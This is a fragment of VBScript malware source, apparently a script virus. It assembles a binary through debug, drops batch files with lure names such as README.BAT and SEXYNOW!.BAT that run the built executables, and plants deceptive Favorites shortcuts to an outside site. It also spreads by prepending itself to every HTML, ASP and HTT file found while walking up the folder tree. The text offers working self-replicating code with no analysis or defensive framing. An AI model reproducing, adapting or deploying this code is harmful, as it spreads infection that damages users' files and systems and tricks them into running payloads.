	ScrFile.WriteLine "E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 10D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 10E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "E 10F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" 
	ScrFile.WriteLine "RCX"
	ScrFile.WriteLine "1000"
	ScrFile.WriteLine "W"
	ScrFile.WriteLine "Q"
	ScrFile.WriteLine ""
	ScrFile.Close
	Set BatFile = FSO.CreateTextFile("c:\Windows\Escritorio\Help.bat", 2, False)
	BatFile.WriteLine ""
	BatFile.WriteLine "@echo off"
	BatFile.WriteLine "debug < C:\[H4[H04.DLL > nul"
	BatFile.WriteLine "C:\SEX4U.EXE"
	BatFile.WriteLine ""
	BatFile.Close
        Set BazFile = FSO.CreateTextFile("C:\SEXYNOW!.BAT", 2, False)
	BazFile.WriteLine ""
	BazFile.WriteLine "@echo off"
	BazFile.WriteLine "debug < C:\[H4[H04.DLL > nul"
	BazFile.WriteLine "C:\SUPERSEX.EXE"
	BazFile.WriteLine ""
	BazFile.Close
        Set BarFile = FSO.CreateTextFile("C:\README.BAT", 2, False)
	BarFile.WriteLine ""
	BarFile.WriteLine "@echo off"
	BarFile.WriteLine "debug < C:\[H4[H04.DLL > nul"
	BarFile.WriteLine "C:\IMPORT.EXE"
	BarFile.WriteLine ""
	BarFile.Close
	Set RealLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\FreeSex.Hypererotika.URL")
	RealLink.TargetPath = "http://pagina.de/HenKy"
	RealLink.Save
        Set RealLink = WshShell.CreateShortcut("C:\WINDOWS\Favoritos\Mikrosoft.msn.URL")
	RealLink.TargetPath = "http://pagina.de/HenKy"
	RealLink.Save
 End If
End If
Sub GetFolder(InfPath)
On Error Resume Next
if FSO.FolderExists(InfPath) then
	Do
	 Set FolderObj = FSO.GetFolder(InfPath)
	 InfPath = FSO.GetParentFolderName(InfPath)
	 Set FO = FolderObj.Files
	 For each target in FO
		ExtName = lcase(FSO.GetExtensionName(target.Name))
		if ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "html" then
			Set Real = FSO.OpenTextFile(target.path, 1, False)
			if Real.readline <> "<!--[H4-->" then
				Real.close()
				GetFile(target.path)
			else
				Real.close()
			end if
		end if
	 next
	Loop Until FolderObj.IsRootFolder = True
end if
End Sub
Sub GetFile(GetFileName)
	Set Real = FSO.OpenTextFile(GetFileName, 1, False)
	FileContents = Real.ReadAll()
	Real.close()
	Set Real = FSO.OpenTextFile(GetFileName, 2, False)
	Real.WriteLine "<!--[H4-->"
	Real.Write("<Html><body>" + Chr(13) + Chr(10))
	Real.WriteLine TRange.htmlText
	Real.WriteLine("</body></html>")
	Real.Write(FileContents)
	Real.close()
End Sub
--></script>

